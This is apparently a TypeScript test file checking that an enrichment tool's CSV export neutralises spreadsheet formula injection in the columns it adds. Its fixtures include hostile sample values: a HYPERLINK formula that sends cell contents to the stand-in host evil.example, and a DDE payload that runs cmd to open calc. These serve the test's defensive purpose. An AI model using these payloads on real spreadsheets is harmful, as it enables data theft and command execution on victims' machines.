import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { parseCsv } from '../src/csv.js';
import { RESULT_HEADERS, buildEnrichedCsv, type TableRow } from '../src/results.js';
import type { DataSourceItem, FieldValue } from '../src/types.js';

const SOURCE = 'ds_sc_test00000001';

const item = (rowNumber: number, objectSid: string | null, extra: Partial<DataSourceItem> = {}): DataSourceItem => ({
  sid: `ds_it_test0000000${rowNumber}`,
  data_source_sid: SOURCE,
  row_number: rowNumber,
  status: 'promoted',
  status_reason: null,
  created_object_sid: objectSid,
  already_in_playtable_sid: null,
  duplicate_action: null,
  ...extra,
});

const row = (sid: string, cell: Partial<FieldValue>): [string, TableRow] => [sid, { sid, cell: { sid: `pt_vl_${sid.slice(6)}`, ...cell } }];

/** The output as one record per line, keyed by header. */
const records = (csv: string): Record<string, string>[] => {
  const table = parseCsv(csv);
  return table.rows.map((values) => Object.fromEntries(table.headers.map((header, i) => [header, values[i] ?? ''])));
};

describe('buildEnrichedCsv, spreadsheet formulas', () => {
  // Every value below that starts with =, +, -, @, a tab or a carriage return
  // stands for text a provider or GetSales could send back.
  const hyperlink = '=HYPERLINK("https://evil.example/?d="&A2,"Open")';
  const built = buildEnrichedCsv({
    headers: ['Company', 'Notes'],
    rows: [
      ['Northwind Labs', '=SUM(A1:A9)'],
      ['Lumen Forge', '+own note'],
      ['Harbor Pine', ''],
      ['Quill Studio', '-'],
    ],
    delimiter: ',',
    items: [
      item(1, 'cr_co_north0000001'),
      item(2, 'cr_co_lumen0000001'),
      item(3, 'cr_co_harbr0000001'),
      item(4, null, { status: 'failed', status_reason: '\r=2+2' }),
    ],
    tableRows: new Map([
      row('cr_co_north0000001', { status: 'done', value: hyperlink, cost: 1, error_msg: null }),
      row('cr_co_lumen0000001', {
        status: 'done',
        value: JSON.stringify({ email: '+1@lumenforge.example', verdict: '@valid', confidence: '-1+1' }),
        // A cost that is not a number never reaches the file.
        cost: '=1+1' as unknown as number,
        error_msg: null,
      }),
      row('cr_co_harbr0000001', { status: 'error', value: '\t=cmd', cost: 0, error_msg: "=cmd|' /C calc'!A0" }),
    ]),
  });
  const lines = records(built.csv);

  it('puts an apostrophe before a result, a verdict, a confidence and a note that would run as formulas', () => {
    assert.equal(lines[0]?.['enrichment_result'], `'${hyperlink}`);
    assert.equal(lines[1]?.['enrichment_result'], "'+1@lumenforge.example");
    assert.equal(lines[1]?.['enrichment_verdict'], "'@valid");
    assert.equal(lines[1]?.['enrichment_confidence'], "'-1+1");
    assert.equal(lines[2]?.['enrichment_result'], "'\t=cmd");
    assert.equal(lines[2]?.['enrichment_note'], "'=cmd|' /C calc'!A0");
    assert.equal(lines[3]?.['enrichment_note'], "'\r=2+2");
  });

  it('writes credits only as a number', () => {
    assert.deepEqual(
      lines.map((line) => line['enrichment_credits']),
      ['1', '', '0', ''],
    );
  });

  it("leaves the user's own columns exactly as they were", () => {
    assert.deepEqual(
      lines.map((line) => [line['Company'], line['Notes']]),
      [
        ['Northwind Labs', '=SUM(A1:A9)'],
        ['Lumen Forge', '+own note'],
        ['Harbor Pine', ''],
        ['Quill Studio', '-'],
      ],
    );
  });

  it('leaves plain values alone and keeps the counts on the real status', () => {
    assert.deepEqual(
      lines.map((line) => [line['enrichment_status'], line['getsales_sid']]),
      [
        ['done', 'cr_co_north0000001'],
        ['done', 'cr_co_lumen0000001'],
        ['error', 'cr_co_harbr0000001'],
        ['failed', ''],
      ],
    );
    assert.deepEqual(built.counts, { done: 2, error: 1, failed: 1 });
    assert.deepEqual(built.headers, ['Company', 'Notes', ...RESULT_HEADERS]);
  });

  it('never leaves a cell of the added columns starting with a formula character', () => {
    const table = parseCsv(built.csv);
    for (const values of table.rows) {
      for (const value of values.slice(2)) assert.doesNotMatch(value, /^[=+\-@\t\r]/, JSON.stringify(value));
    }
  });
});
